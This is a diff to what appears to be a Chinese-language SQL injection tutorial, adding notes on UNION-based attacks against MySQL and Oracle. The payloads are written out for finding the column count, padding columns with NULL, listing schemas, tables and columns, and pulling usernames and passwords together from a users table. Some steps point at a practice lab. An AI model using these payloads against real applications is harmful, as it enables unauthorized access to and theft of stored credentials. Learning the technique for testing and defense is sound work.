@@ -113,6 +113,26 @@ SELECT [colums_name] from [table_name] or UNION SELECT x, y, z-
 
 输入payload:  'union select 1,2 --'   相当于执行语句  mysql> select user_name , user_password from user_information where user_id=' 'union select 1,2--'';
 
+当应用程序容易受到 SQL 注入攻击并且查询结果在应用程序的响应中返回时，该`UNION`关键字可用于从数据库中的其他表中检索数据。这会导致 SQL 注入 UNION 攻击。
+
+该`UNION`关键字允许您执行一个或多个附加`SELECT`查询并将结果附加到原始查询。例如：
+
+```
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+```
+
+此 SQL 查询将返回具有两列的单个结果集，其中包含来自 columns`a`和`b`in`table1`以及 columns`c`和`d`in `table2`的值。
+
+要使`UNION`查询起作用，必须满足两个关键要求：
+
+- 各个查询必须返回相同数量的列。
+- 每列中的数据类型必须在各个查询之间兼容。
+
+要进行 SQL 注入 UNION 攻击，您需要确保您的攻击满足这两个要求。这通常涉及弄清楚：
+
+- 从原始查询返回了多少列？
+- 从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果？
+
 
 
 ```
@@ -132,6 +152,26 @@ order字句查询列数
 1' order by 3#
 1' order by 4#
 ```
+
+- 使用`NULL`作为注入`SELECT`查询返回值的原因是每列中的数据类型必须在原始查询和注入查询之间兼容。由于`NULL`可转换为每种常用数据类型，因此`NULL`在列数正确时使用可以最大限度地提高有效负载成功的机会。
+- 在 Oracle 上，每个`SELECT`查询都必须使用`FROM`关键字并指定一个有效的表。Oracle 上有一个内置表`dual`，可用于此目的。所以注入的查询甲骨文将需要看起来像：`' UNION SELECT NULL FROM DUAL--`。
+- 所描述的有效负载使用双破折号注释序列`--`来注释掉注入点之后的原始查询的其余部分。在 MySQL 上，双破折号序列后必须跟一个空格。或者，`#`可以使用散列字符来标识评论。
+
+## 在单列中检索多个值
+
+在前面的示例中，假设查询仅返回单个列。
+
+通过将值连接在一起，您可以轻松地在此单列中检索多个值，最好包括一个合适的分隔符来区分组合值。例如，在 Oracle 上，您可以提交输入：
+
+```
+' UNION SELECT username || '~' || password FROM users--
+```
+
+这使用双管道序列`||`，它是 Oracle 上的字符串连接运算符。注入的查询将`username`和`password`字段的值连接在一起，由`~`字符分隔。
+
+MySQL可以用CONCAT(username,'-->',password)
+
+
 
 ## 延时注入
 
@@ -172,6 +212,10 @@ http://daishen.ltd:1112/Less-1/?id=1
 
 ```
 id=1' order by 4 --+
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
 ```
 
 3.判断字段位置
@@ -186,18 +230,26 @@ id=1' and 1=2 union select 1,2,3 --+
 id=1' and 1=2 union select 1,database(),3 --+   查看当前库
 
 id=1' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+
+
 ```
 
 5.爆指定库的所有表
 
 ```
 id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
+
+oracle:
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
 ```
 
 6.爆指定表的所有字段
 
 ```
 id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
+
+oracle
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
 ```
 
 7.爆出字段内容
